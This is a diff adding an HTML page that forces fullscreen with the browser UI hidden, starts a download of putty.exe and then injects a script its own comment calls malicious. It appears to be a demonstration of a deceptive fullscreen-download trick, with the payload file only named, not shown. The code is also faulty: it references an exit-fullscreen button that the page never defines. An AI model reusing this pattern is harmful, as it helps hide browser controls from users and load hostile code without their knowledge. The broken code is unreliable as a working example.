@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Download in Fullscreen Mode</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+    }
+    #notification {
+      margin-top: 20px;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <h1>Download in Fullscreen Mode</h1>
+  <button id="start-download">Start</button>
+  <div id="notification"></div>
+
+  <script>
+    const startDownloadButton = document.getElementById('start-download');
+    const exitFullscreenButton = document.getElementById('exit-fullscreen');
+    const notificationDiv = document.getElementById('notification');
+
+    startDownloadButton.addEventListener('click', startDownload);
+    exitFullscreenButton.addEventListener('click', exitFullscreen);
+
+function startDownload() {
+  document.documentElement.requestFullscreen({ navigationUI: 'hide' }).then(() => {
+    const download = document.createElement('a');
+    download.href = 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe';
+    download.download = 'putty.exe';
+    download.click();
+
+    // Add a malicious script to the page
+    const maliciousScript = document.createElement('script');
+    maliciousScript.src = 'malicious-script.js';
+    document.body.appendChild(maliciousScript);
+  });
+}
+
+     function exitFullscreen() {
+       if (document.exitFullscreen) {
+        document.exitFullscreen();
+      } else if (document.mozCancelFullScreen) {  
+        document.mozCancelFullScreen();
+      } else if (document.webkitExitFullscreen) {  
+        document.webkitExitFullscreen();
+      } else if (document.msExitFullscreen) {  
+        document.msExitFullscreen();
+      }
+    }
+  </script>
+</body>
+</html>
